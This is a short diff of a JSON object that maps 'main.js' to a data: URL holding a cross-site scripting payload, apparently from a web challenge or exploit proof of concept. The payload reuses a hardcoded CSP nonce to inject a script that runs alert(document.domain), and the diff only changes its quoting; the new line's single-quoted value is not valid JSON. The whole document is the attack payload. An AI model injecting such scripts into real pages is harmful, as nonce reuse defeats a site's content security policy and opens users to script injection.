@@ -1,5 +1,5 @@
 {
   "files": {
-    "main.js": "data:,window.addEventListener('DOMContentLoaded',()=>{const s=document.createElement('script');s.nonce='3fc3702b61416a8c';s.innerHTML='alert(document.domain)';document.body.appendChild(s)});//"
+    "main.js": 'data:,window.addEventListener("DOMContentLoaded",()=>{const s=document.createElement("script");s.nonce="3fc3702b61416a8c";s.innerHTML="alert(document.domain)";document.body.appendChild(s)});//'
   }
 }
